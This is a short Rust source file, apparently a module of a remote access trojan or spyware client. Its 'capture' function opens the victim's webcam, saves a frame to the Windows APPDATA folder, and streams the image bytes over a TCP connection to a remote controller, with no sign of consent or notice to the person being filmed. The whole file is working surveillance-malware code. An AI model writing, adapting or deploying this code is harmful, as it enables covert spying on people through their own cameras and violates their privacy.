use std::net::TcpStream;
use std::io::{Read, Write};

pub fn capture(mut stream: &TcpStream) {
  let camera = match camera_capture::create(0) {
    Ok(cam) => cam,
    Err(_) => {
      stream.write_all("failed-create".as_bytes()).unwrap();
      return;
    }
  };

  let mut camera = match camera.fps(5.0).unwrap().start() {
    Ok(cam) => cam,
    Err(_) => {
      stream.write_all("failed-start".as_bytes()).unwrap();
      return;
    }
  };

  if let Some(frame) = camera.next() {
    let image_buffer = image::ImageBuffer::from_raw(frame.width(), frame.height(), frame.to_vec()).unwrap();
    let image = image::DynamicImage::ImageRgb8(image_buffer);

    if let Err(_) = image.save(std::env::var("APPDATA").unwrap().clone() + "\\webcam.png") {
      stream.write_all("failed-save".as_bytes()).unwrap();
      return;
    }

    stream.write_all("captured".as_bytes()).unwrap();
    let mut file = std::fs::File::open(std::env::var("APPDATA").unwrap().clone() + "\\webcam.png").unwrap();
    let metadata = file.metadata().unwrap();
    let file_size = metadata.len() as usize;

    stream.write_all(file_size.to_string().as_bytes()).unwrap();
    std::thread::sleep(std::time::Duration::from_secs(1));

    let mut buffer = vec![0; file_size];
    file.read_exact(&mut buffer).unwrap();
    stream.write_all(&buffer).unwrap();
  }
}